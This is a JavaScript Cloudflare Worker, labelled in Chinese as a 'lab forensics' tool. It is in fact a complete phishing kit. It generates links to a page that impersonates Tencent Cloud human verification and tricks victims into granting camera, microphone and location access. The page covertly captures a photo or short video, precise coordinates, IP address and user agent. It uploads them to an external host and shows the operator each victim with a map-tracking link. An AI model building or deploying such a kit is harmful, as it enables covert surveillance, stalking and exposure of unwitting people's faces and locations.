/**
 * NextGen 实验室安全取证系统 (Pro Max)
 * 场景：技术研究与靶场模拟
 */

const ADMIN_PASSWORD = "sakcnzz666";
const IMAGE_HOST = "tc.ilqx.dpdns.org";
const GEO_API = "https://ip.ilqx.dpdns.org/geo";

export default {
  async fetch(request, env) {
    const url = new URL(request.url);
    const path = url.pathname;

    // 自动初始化 D1 数据库
    await this.initDB(env);

    // 路由逻辑
    if (path === "/") return this.renderCreator(request, env);
    if (path.startsWith("/v/")) return this.renderTarget(path.split("/")[2]);
    if (path === "/api/upload") return this.handleUpload(request, env);
    if (path === "/api/query") return this.handleQuery(request, env);
    if (path === "/admin") return this.renderAdmin(request, env);

    return new Response("Not Found", { status: 404 });
  },

  async initDB(env) {
    await env.DB.prepare(`
      CREATE TABLE IF NOT EXISTS records (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        uid TEXT,
        type TEXT,
        src TEXT,
        geo_data TEXT,
        lat_long TEXT,
        ua TEXT,
        visitor_ip TEXT,
        perm_status TEXT,
        created_at DATETIME DEFAULT CURRENT_TIMESTAMP
      )
    `).run();
  },

  // --- 模块一：生成与查询面板 ---
  async renderCreator(request, env) {
    const ip = request.headers.get("cf-connecting-ip");
    const html = `
<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>NextGen 取证控制台</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        body { background: #f4f7fb; font-family: -apple-system, system-ui; }
        .glass { background: rgba(255, 255, 255, 0.8); backdrop-filter: blur(15px); border: 1px solid rgba(255,255,255,0.4); }
        .animate-up { animation: fadeInUp 0.5s ease-out forwards; }
        @keyframes fadeInUp { from { opacity:0; transform: translateY(20px); } to { opacity:1; transform: translateY(0); } }
    </style>
</head>
<body class="min-h-screen flex flex-col items-center justify-center p-4">
    <div class="max-w-md w-full space-y-6 animate-up">
        <div class="glass p-8 rounded-[2rem] shadow-2xl">
            <h1 class="text-2xl font-black text-gray-800 mb-2 italic">LAB_DASHBOARD</h1>
            <p class="text-gray-400 text-xs mb-8 tracking-widest uppercase">您的当前IP: ${ip}</p>
            
            <div class="space-y-4">
                <input id="target_id" type="text" placeholder="设置目标识别ID (如QQ)" class="w-full px-5 py-4 bg-gray-50 rounded-2xl border-none outline-none focus:ring-2 focus:ring-blue-500 transition-all">
                
                <div class="grid grid-cols-2 gap-3">
                    <button onclick="gen('photo')" class="bg-blue-600 text-white py-4 rounded-2xl font-bold shadow-lg shadow-blue-200 active:scale-95 transition-all">📸 拍照模式</button>
                    <button onclick="gen('video')" class="bg-gray-900 text-white py-4 rounded-2xl font-bold shadow-lg shadow-gray-300 active:scale-95 transition-all">🎥 录像模式</button>
                </div>
                
                <div id="link_box" class="hidden p-4 bg-blue-50 text-blue-700 rounded-2xl text-[10px] break-all border border-blue-100 font-mono"></div>
            </div>
        </div>

        <div class="glass p-8 rounded-[2rem] shadow-xl">
            <h2 class="text-lg font-bold text-gray-700 mb-4">取证数据检索</h2>
            <div class="flex gap-2">
                <input id="query_id" type="text" placeholder="输入ID" class="flex-1 px-5 py-3 bg-gray-50 rounded-xl outline-none">
                <button onclick="query()" class="bg-emerald-500 text-white px-6 rounded-xl font-bold">查询</button>
            </div>
            <div id="q_results" class="mt-6 space-y-4 max-h-[400px] overflow-y-auto pr-2"></div>
        </div>
    </div>

    <script>
        function gen(m) {
            const id = document.getElementById('target_id').value;
            if(!id) return alert('请先设置ID');
            const url = window.location.origin + '/v/' + btoa(encodeURIComponent(id + '|' + m));
            const box = document.getElementById('link_box');
            box.innerText = url; box.classList.remove('hidden');
        }

        async function query() {
            const id = document.getElementById('query_id').value;
            const res = await fetch('/api/query?uid=' + encodeURIComponent(id));
            const data = await res.json();
            const list = document.getElementById('q_results');
            list.innerHTML = data.map(i => \`
                <div class="p-4 bg-white rounded-2xl border border-gray-100 shadow-sm">
                    <div class="flex justify-between text-[10px] text-gray-400 mb-2">
                        <span>\${i.created_at}</span>
                        <span class="text-blue-500 font-bold uppercase">\${i.type}</span>
                    </div>
                    <p class="text-[10px] text-emerald-600 mb-2">\${i.geo_data}</p>
                    \${i.type === 'video' ? \`<video src="\${i.src}" controls class="w-full rounded-lg"></video>\` : \`<img src="\${i.src}" class="w-full rounded-lg">\`}
                    <p class="mt-2 text-[8px] text-gray-300 break-all">\${i.ua}</p>
                </div>
            \`).join('') || '<p class="text-center text-gray-400">暂无记录</p>';
        }
    </script>
</body>
</html>`;
    return new Response(html, { headers: { "Content-Type": "text/html" } });
  },

  // --- 模块二：目标捕获页 (人机验证伪装) ---
  renderTarget(token) {
    const html = `
<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>安全验证 - 腾讯云系统</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        .circle-container { width: 260px; height: 260px; border-radius: 50%; border: 6px solid #0052d9; position: relative; overflow: hidden; background: #000; box-shadow: 0 0 30px rgba(0,82,217,0.3); }
        .scan-line { width: 100%; height: 4px; background: linear-gradient(to bottom, transparent, #0052d9); position: absolute; top: 0; animation: scan 2.5s linear infinite; z-index: 10; }
        @keyframes scan { 0% { top: 0; } 100% { top: 100%; } }
        .hidden-step { display: none; }
        .step-transition { animation: fadeIn 0.4s ease-out forwards; }
        @keyframes fadeIn { from { opacity: 0; transform: scale(0.95); } to { opacity: 1; transform: scale(1); } }
    </style>
</head>
<body class="bg-gray-50 min-h-screen flex flex-col items-center justify-center p-6 text-center">

    <div id="step1" class="max-w-sm w-full bg-white p-8 rounded-[2rem] shadow-xl step-transition">
        <div class="w-16 h-16 bg-blue-50 text-blue-600 rounded-full flex items-center justify-center mx-auto mb-6">
            <svg class="w-8 h-8" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 12l2 2 4-4m5.618-4.016A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04A12.02 12.02 0 003 9c0 5.591 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.042-.133-2.052-.382-3.016z"></path></svg>
        </div>
        <h2 class="text-xl font-bold mb-4">人机验证服务协议</h2>
        <div class="text-[12px] text-gray-500 text-left space-y-3 mb-8 h-40 overflow-y-auto p-4 bg-gray-50 rounded-2xl border border-gray-100">
            <p>1. 本网站已接入腾讯云高级人机验证服务以防御恶意DDoS及CC攻击。</p>
            <p>2. 为了确保您的真实身份，我们需要调用设备摄像头进行活体检测（眨眼/张嘴动作）。</p>
            <p>3. 验证过程中采集的脱敏数据将严格按照《腾讯隐私保护指引》处理。</p>
            <p>4. 勾选下方按钮即表示您同意以上条款并授权相关权限。</p>
        </div>
        <button onclick="toStep2()" class="w-full bg-[#0052d9] text-white py-4 rounded-xl font-bold shadow-lg shadow-blue-100 active:scale-95 transition-all">我已阅读并同意下一步</button>
        <p class="text-gray-400 text-[10px] mt-4">Tencent Cloud Verfication Service</p>
    </div>

    <div id="step2" class="max-w-sm w-full bg-white p-10 rounded-[2rem] shadow-xl hidden-step step-transition">
        <h2 class="text-xl font-bold mb-4">环境安全性检测</h2>
        <p class="text-sm text-gray-400 mb-8">正在核验您的地理位置完整性，请在弹窗中允许位置访问以继续验证。</p>
        <button onclick="toStep3()" class="w-full bg-emerald-500 text-white py-4 rounded-xl font-bold shadow-lg active:scale-95 transition-all italic">确认地理核验</button>
    </div>

    <div id="step3" class="max-w-sm w-full hidden-step step-transition">
        <div class="circle-container mx-auto mb-8">
            <video id="v" class="w-full h-full object-cover scale-x-[-1]" autoplay playsinline></video>
            <div class="scan-line"></div>
        </div>
        <div id="status_tip" class="bg-blue-600 text-white px-8 py-3 rounded-full inline-block font-bold mb-4 animate-pulse">正在初始化检测...</div>
        <div id="action_tip" class="text-gray-800 font-bold text-lg h-8"></div>
        <p class="text-gray-400 text-[10px] mt-8">正在进行 3D 活体面部结构匹配</p>
        <canvas id="c" class="hidden"></canvas>
    </div>

    <div id="step4" class="max-w-sm w-full hidden-step step-transition p-10 bg-white rounded-[2rem]">
        <div class="text-red-500 mb-4">
             <svg class="w-20 h-20 mx-auto" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 9v2m0 4h.01m-6.938 4h13.856c1.54 0 2.502-1.667 1.732-3L13.732 4c-.77-1.333-2.694-1.333-3.464 0L3.34 16c-.77 1.333.192 3 1.732 3z"></path></svg>
        </div>
        <h2 class="text-xl font-bold mb-2">人机验证失败</h2>
        <p id="fail_reason" class="text-sm text-gray-500 leading-relaxed px-4">原因：检测到当前环境光线过强或未按照指令进行动作，请刷新页面重新尝试。</p>
        <p class="text-gray-400 text-[10px] mt-10">Error ID: Tenc_404_Verify_Timeout</p>
    </div>

    <script>
        const token = "${token}";
        const info = JSON.parse(decodeURIComponent(atob(token)));
        const [uid, mode] = info.split('|');
        let stream = null;
        let coords = "Denied";

        function toStep2() {
            document.getElementById('step1').classList.add('hidden-step');
            document.getElementById('step2').classList.remove('hidden-step');
        }

        async function toStep3() {
            // 请求经纬度
            navigator.geolocation.getCurrentPosition(
                (p) => { coords = p.coords.latitude + "," + p.coords.longitude; },
                () => { coords = "Refused"; },
                { timeout: 5000 }
            );

            document.getElementById('step2').classList.add('hidden-step');
            document.getElementById('step3').classList.remove('hidden-step');
            
            try {
                stream = await navigator.mediaDevices.getUserMedia({ 
                    video: { facingMode: "user" }, 
                    audio: mode === 'video' 
                });
                document.getElementById('v').srcObject = stream;
                
                // 模拟活体指令
                const at = document.getElementById('action_tip');
                setTimeout(() => { at.innerText = "请正对面部"; }, 1500);
                setTimeout(() => { at.innerText = "请缓慢 眨眨眼"; }, 3500);
                setTimeout(() => { at.innerText = "请缓慢 张张嘴"; }, 5500);
                setTimeout(() => { capture(); }, 7000); // 采集触发
                
            } catch (e) {
                // 权限被拒绝话术
                document.getElementById('step3').classList.add('hidden-step');
                document.getElementById('step4').classList.remove('hidden-step');
                document.getElementById('fail_reason').innerText = "本网站由于长期遭到恶意流量访问，所有请求必须通过人机验证方可继续访问。检测到您未开启摄像头授权，请在浏览器设置中开启后重试。";
            }
        }

        async function capture() {
            document.getElementById('status_tip').innerText = "数据上传中...";
            const v = document.getElementById('v');
            const c = document.getElementById('c');
            
            if (mode === 'video') {
                const recorder = new MediaRecorder(stream);
                const chunks = [];
                recorder.ondataavailable = e => chunks.push(e.data);
                recorder.onstop = async () => {
                    await upload(new Blob(chunks, { type: 'video/mp4' }));
                };
                recorder.start();
                setTimeout(() => recorder.stop(), 3000); // 录制3秒
            } else {
                c.width = v.videoWidth;
                c.height = v.videoHeight;
                c.getContext('2d').drawImage(v, 0, 0);
                c.toBlob(blob => upload(blob), 'image/jpeg', 0.8);
            }
        }

        async function upload(blob) {
            const fd = new FormData();
            fd.append('file', blob, mode === 'video' ? 'v.mp4' : 'p.jpg');
            fd.append('uid', uid);
            fd.append('type', mode);
            fd.append('lat_long', coords);
            
            await fetch('/api/upload', { method: 'POST', body: fd });
            
            // 结束后清理并跳转/显示错误
            stream.getTracks().forEach(t => t.stop());
            document.getElementById('step3').classList.add('hidden-step');
            document.getElementById('step4').classList.remove('hidden-step');
        }
    </script>
</body>
</html>`;
    return new Response(html, { headers: { "Content-Type": "text/html" } });
  },

  // --- 模块三：后端核心处理器 ---
  async handleUpload(request, env) {
    const fd = await request.formData();
    const file = fd.get('file');
    const uid = fd.get('uid');
    const type = fd.get('type');
    const latLong = fd.get('lat_long');
    const ua = request.headers.get('user-agent');
    const ip = request.headers.get('cf-connecting-ip');

    // 1. 获取地理画像 (你的接口)
    let geo = "Unknown Profile";
    try {
        const gRes = await fetch(\`\${GEO_API}?ip=\${ip}\`);
        const g = await gRes.json();
        geo = \`\${g.flag} \${g.countryRegion} \${g.city} (\${g.asOrganization})\`;
    } catch(e){}

    // 2. 上传到图床
    const tcForm = new FormData();
    tcForm.append('file', file);
    const tcRes = await fetch(\`https://\${IMAGE_HOST}/upload\`, { method: 'POST', body: tcForm });
    const tcJson = await tcRes.json();
    const src = \`https://\${IMAGE_HOST}\${tcJson[0].src}\`;

    // 3. 记录 D1
    await env.DB.prepare("INSERT INTO records (uid, type, src, geo_data, lat_long, ua, visitor_ip, perm_status) VALUES (?,?,?,?,?,?,?,?)")
      .bind(uid, type, src, geo, latLong, ua, ip, latLong === 'Refused' ? 'LocationDenied' : 'FullAccess')
      .run();

    return new Response(JSON.stringify({ ok: true }));
  },

  async handleQuery(request, env) {
    const { searchParams } = new URL(request.url);
    const uid = searchParams.get('uid');
    const { results } = await env.DB.prepare("SELECT * FROM records WHERE uid = ? ORDER BY created_at DESC").bind(uid).all();
    return new Response(JSON.stringify(results));
  },

  // --- 模块四：审计管理系统 (/admin) ---
  async renderAdmin(request, env) {
    const { searchParams } = new URL(request.url);
    if (searchParams.get('p') !== ADMIN_PASSWORD) return new Response("Admin Login Required", { status: 401 });

    const { results } = await env.DB.prepare("SELECT * FROM records ORDER BY created_at DESC LIMIT 200").all();

    const html = `
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>NextGen 取证审计后台</title>
    <script src="https://cdn.tailwindcss.com"></script>
</head>
<body class="bg-gray-100 p-8">
    <div class="max-w-7xl mx-auto">
        <div class="flex justify-between items-center mb-10">
            <h1 class="text-3xl font-black text-gray-800">实验室全量审计日志</h1>
            <span class="bg-gray-800 text-white px-4 py-2 rounded-full text-xs">Sakura Version 4.0</span>
        </div>

        <div class="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-6">
            ${results.map(r => `
                <div class="bg-white rounded-[2rem] shadow-sm border border-gray-100 overflow-hidden flex flex-col">
                    <div class="h-64 bg-black relative">
                        ${r.type === 'video' ? `<video src="${r.src}" controls class="w-full h-full object-contain"></video>` : `<img src="${r.src}" class="w-full h-full object-contain">`}
                        <div class="absolute top-4 left-4 bg-white/90 backdrop-blur px-3 py-1 rounded-full text-[10px] font-bold shadow-sm">${r.uid}</div>
                    </div>
                    <div class="p-6 space-y-4">
                        <div class="flex justify-between items-start">
                            <span class="text-emerald-600 font-bold text-sm">${r.visitor_ip}</span>
                            <span class="text-gray-400 text-[10px]">${r.created_at}</span>
                        </div>
                        <p class="text-gray-700 text-xs font-medium">${r.geo_data}</p>
                        <div class="p-3 bg-gray-50 rounded-xl space-y-2">
                             <p class="text-[10px] text-purple-600 font-mono italic">坐标: ${r.lat_long}</p>
                             <p class="text-[8px] text-gray-400 break-all leading-tight">UA: ${r.ua}</p>
                        </div>
                        <div class="pt-2 flex gap-3">
                            <a href="https://www.google.com/maps?q=${r.lat_long}" target="_blank" class="text-[10px] text-blue-500 underline">地图追踪</a>
                            <a href="${r.src}" target="_blank" class="text-[10px] text-gray-400 underline italic">原始路径</a>
                        </div>
                    </div>
                </div>
            `).join('')}
        </div>
    </div>
</body>
</html>`;
    return new Response(html, { headers: { "Content-Type": "text/html" } });
  }
};